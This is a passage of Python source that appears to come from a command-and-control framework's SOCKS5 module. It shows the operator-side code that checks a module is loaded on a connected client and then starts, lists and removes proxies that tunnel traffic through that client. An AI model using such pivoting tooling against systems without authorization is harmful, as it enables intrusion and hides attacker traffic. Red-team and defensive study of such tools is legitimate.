                self.list_socks()
            elif command_parsed[0].lower() == 'socks5_remove':
                self.socks_remove(command_parsed)
            elif command_parsed[0].lower() == 'socks5_remove_all':
                self.socks_remove_all()

    def create_socks(self, command_parsed):
        if len(command_parsed) > 3:

            if len(command_parsed) == 4:
                command_parsed.append('username')
                command_parsed.append('password')
            if len(command_parsed) == 5:
                command_parsed.append('password')

            client_id = self.c2_manager.get_client_id_by_client_name(command_parsed[1])

            self.c2_manager.master_connection.send_service(client_id, 'checkmodule', {'name': self.MODULE_NAME})
            response = self.c2_manager.master_connection.recv_service_response(client_id, 'checkmodule')
            if not response['status']:
               raise ClientModuleNotLoaded(client_id, self.MODULE_NAME, response['client_type'])

            socks = SocksProxy(self.c2_manager.connector_factory, client_id, command_parsed[2], int(command_parsed[3]), command_parsed[4], command_parsed[5])
            socks.start()
            if not hasattr(self.c2_manager, 'module_socks5'):
                self.c2_manager.module_socks5 = []
            time.sleep(0.1)
            self.c2_manager.module_socks5.append(socks)
            self.list_socks()

        else:
            print('[!] Incorrect parameters')

    def list_socks(self):
        print()
        if not hasattr(self.c2_manager, 'module_socks5'):
            self.c2_manager.module_socks5 = []
        self.c2_manager.module_socks5 = [t for t in self.c2_manager.module_socks5 if t.is_alive()]
        count = 0
        rows = []
        for proxy in self.c2_manager.module_socks5:
            rows.append([count, self.c2_manager.get_client_name_by_client_id(proxy.client_id), '{}:{}'.format(proxy.host, proxy.port), proxy.username, proxy.password])
            count += 1
        print(tabulate(rows, headers=['ID', 'Client', 'Host:Port', 'Username', 'Password']))
        print()

    def socks_remove(self, command_parsed):
        if not hasattr(self.c2_manager, 'module_socks5'):
            self.c2_manager.module_socks5 = []
        self.c2_manager.module_socks5 = [t for t in self.c2_manager.module_socks5 if t.is_alive()]
        if len(command_parsed) < 2:
            print('[-] Invalid command.')
            return
        try:
            socks_num = int(command_parsed[1])
        except ValueError:
            print('[-] Invalid command. Socks number must be a integer number.')
            return
        if len(self.c2_manager.module_socks5) <= socks_num:
            print('[-] Invalid proxy socks number.')
            return
        if self.c2_manager.module_socks5[socks_num].is_alive():
            self.c2_manager.module_socks5[socks_num].stop()
            del self.c2_manager.module_socks5[socks_num]

        self.list_socks()

    def socks_remove_all(self):
        if not hasattr(self.c2_manager, 'module_socks5'):
            self.c2_manager.module_socks5 = []
        self.c2_manager.module_socks5 = [t for t in self.c2_manager.module_socks5 if t.is_alive()]
        for proxy in self.c2_manager.module_socks5:
            if proxy.is_alive():
                proxy.stop()
